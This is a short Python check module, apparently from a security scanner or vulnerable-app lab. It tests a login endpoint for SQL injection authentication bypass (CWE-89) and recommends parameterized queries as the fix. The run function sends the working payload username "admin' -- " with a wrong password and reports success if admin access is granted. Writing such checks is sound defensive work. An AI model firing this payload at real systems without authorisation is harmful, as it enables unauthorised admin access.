ID = "A01"
NAME = "SQL injection (auth bypass)"
SEVERITY = "CRITICAL"
CWE = "CWE-89"
EYE = "attack"
FIX = "Use parameterized queries (cursor.execute(sql, params)); never build SQL by string formatting."


def run(ctx):
    s = ctx.session()
    r = s.post(ctx.base_url + "/login", data={"username": "admin' -- ", "password": "wrong"})
    try:
        j = r.json()
    except Exception:
        return False, "no JSON response"
    if j.get("ok") and j.get("role") == "admin":
        return True, "POST /login username=\"admin' -- \" password=\"wrong\" → logged in as admin"
    return False, "not vulnerable"
